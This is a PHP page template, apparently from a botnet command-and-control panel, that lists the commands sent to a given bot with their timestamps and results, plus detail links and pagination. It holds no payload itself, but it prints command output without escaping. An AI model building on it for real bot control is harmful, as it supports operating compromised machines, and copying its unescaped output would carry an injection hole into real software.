<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link rel="stylesheet" type="text/css" href="../css/view.css" />
    <script src="https://kit.fontawesome.com/yourcode.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
    <title>View Cmd</title>
</head>

<body>
    <div class="container">
        <div class="inputCommand">
            <div class="header">
                <ul class="ul_header">
                    <li class="li_header label_header">
                        <label for="">CMD Result IdBot=<?php echo $id; ?></label>
                    </li>
                </ul>
                <ul class="ul_header">
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-minus" style="color: black; text-shadow: none"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-regular fa-square" style="color: black; text-shadow: none"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-x" style="color: black; text-shadow: none"></i>
                    </li>
                </ul>
            </div>
            <div class="content">
                <div style="  height: 410px; ">
                    <table class="content_table">
                        <tr class="content_table-thead">
                            <th class="content_table-th">ID Cmd</th>
                            <th class="content_table-th">Time</th>
                            <th class="content_table-th">Cmd</th>
                            <th class="content_table-th">Result</th>
                            <th class="content_table-th">Detail</th>
                        </tr>
                        <?php
                        foreach ($listCmd as $index => $cmd) {
                            echo '<tr class="content_table-tr">';
                            $detail = '<a class="link_detail" href="../Controller/C_Cmd.php?opt=detail&IdBot=' . $cmd->getIdBot() . '&IdCmd=' . $cmd->getIdCmd() . '">detail</a>';
                            echo '<td class="content_table-td">' . $cmd->getIdCmd() . '</td>
                                <td class="content_table-td">' . $cmd->getTime() . '</td>
                                <td class="content_table-td">' . $cmd->getCmd() . '</td>
                                <td class="content_table-td">' . $cmd->getCmdResult() . '</td>
                                <td class="content_table-td">' . $detail . '</td>';
                            echo '</tr>';
                        }
                        ?>


                    </table>
                </div>
                <div style="margin:16px 0px;  display:flex; column-gap: 8px; flex-wrap: wrap;">

                    <?php
                    if ($count > 15) {
                        echo '<p >Page</p>';
                        for ($i = 0; $i < $count / 15; $i++) {
                            if (isset($_GET['opt'])) {
                                $href = "C_Cmd.php?opt=view&page=" . $i . "&ID=" . $id;
                            }
                            $numPage = $i + 1;
                            $link = "<a style='text-decoration:underline; border: 1px solid #00ff00; padding:2px 4px; color: #00ff00;' href='" . $href . "'>" . $numPage . "</a>";
                            echo $link;
                        }
                    }
                    ?>


                </div>
                <button class="content_back" onclick="history.back()">Go Back</button>
            </div>
        </div>
        <?php
        include_once("navigate.php");
        ?>
    </div>
</body>

</html>